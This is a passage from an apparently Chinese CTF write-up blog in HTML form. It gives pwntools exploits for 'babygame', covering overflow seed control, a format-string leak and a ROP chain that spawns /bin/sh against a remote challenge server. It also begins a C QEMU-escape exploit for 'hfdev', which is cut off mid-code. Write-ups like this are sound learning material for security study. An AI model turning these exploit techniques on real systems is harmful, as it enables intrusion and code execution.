class="hljs-comment"># pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="babygame"><a href="#babygame" class="headerlink" title="babygame"></a>babygame</h3><p>唯一一个自己成功写出来的题。</p><p>这里的变量v5可以直接被后面的溢出覆盖，让接下来的游戏中的随机数变成伪随机数</p><img src="/img/15/Screenshot 2023-07-10 173013.png" style="zoom: 80%;" /><p>顺利通过游戏后就有一个格式化字符串漏洞，但只有一次，泄漏出相关信息后还要改变返回地址，所以需要栈上的一些与返回地址距离比较近的栈值去修改，当然这有1&#x2F;16的机率修改成功</p><img src="/img/15/Screenshot 2023-07-10 164617.jpg" style="zoom:80%;" /><p>修改返回值为0x153E，再次使用格式化字符串漏洞，利用之前泄漏的信息去改变返回地址为主函数，利用栈溢出直接ROP。</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;babygame&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc-2.31.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./babygame&#x27;, aslr=False)</span><br>p = remote(<span class="hljs-string">&#x27;112.74.186.148&#x27;</span>,<span class="hljs-number">49378</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + p64(<span class="hljs-number">0</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;:&#x27;</span>, payload)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br><br><br>payload = <span class="hljs-string">b&#x27;%39$p%40$p%41$p%79$p&#x27;</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">2</span> + <span class="hljs-string">b&#x27;%22$hhn&#x27;</span><br>payload = payload.ljust(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + <span class="hljs-string">b&#x27;\x78&#x27;</span><br>p.sendafter(<span class="hljs-string">b&#x27;you.&#x27;</span>, payload)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>stack = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>elf.address = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x1543</span><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>libc.address = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>] - <span class="hljs-number">243</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(elf.address))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br><br>payload = fmtstr_payload(<span class="hljs-number">6</span>, &#123;(stack - <span class="hljs-number">0x128</span>) : (elf.address + <span class="hljs-number">0x146a</span>)&#125;,  write_size=<span class="hljs-string">&#x27;byte&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;you.&#x27;</span>, payload)<br><br>pop_rdi_ret = libc.address + <span class="hljs-number">0x23b72</span><br>pop_rsi_ret = libc.address + <span class="hljs-number">0x2604f</span><br>pop_rdx__r12_ret = libc.address + <span class="hljs-number">0x119241</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x108</span> + p64(canary) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span><br>payload += flat(<br>    pop_rdi_ret, <span class="hljs-number">0</span>,<br>    pop_rsi_ret, stack,<br>    pop_rdx__r12_ret, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>,<br>    libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>],<br>    pop_rdi_ret, stack,<br>    pop_rdi_ret + <span class="hljs-number">1</span>,<br>    libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>)<br><br>p.sendafter(<span class="hljs-string">b&#x27;:&#x27;</span>, payload)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br><span class="hljs-comment">#pause()</span><br>p.send(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>​                                    </p><h3 id="hfdev"><a href="#hfdev" class="headerlink" title="hfdev"></a>hfdev</h3><p>这道qemu逃逸果然不会，具体细节就看本文开头推荐的文章，这里就说一下自己遇到的坑：</p><ol><li>刚开始用inl和outl读写数据，但完全没反应，这题要用inw和outw读写。</li><li>执行hfdev_process函数后一定要sleep，感觉应该是多线程的原因，exp的主函数是与hfdev_process函数同时运行的，如果不sleep会造成条件竞争，后面设置的数据会影响上一次的hfdev_process函数的执行。</li></ol><p>​                                                               </p><p>这里是本地ubuntu20复现的exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> port_base = <span class="hljs-number">0xc040</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SHIFT  12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span><br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">page_offset</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr)</span><br>&#123;<br>    <span class="hljs-comment">// addr &amp; 0xfff</span><br>    <span class="hljs-keyword">return</span> addr &amp; ((<span class="hljs-number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gfn</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> pme, gfn;<br>    <span class="hljs-type">size_t</span> offset;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;open&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-comment">//printf(&quot;pfn_item_offset : %p\n&quot;, (uintptr_t)addr &gt;&gt; 9);</span><br>    offset = ((<span class="hljs-type">uintptr_t</span>)addr &gt;&gt; <span class="hljs-number">9</span>) &amp; ~<span class="hljs-number">7</span>;<br>    lseek(fd, offset, SEEK_SET);<br>    read(fd, &amp;pme, <span class="hljs-number">8</span>);<br>    <span 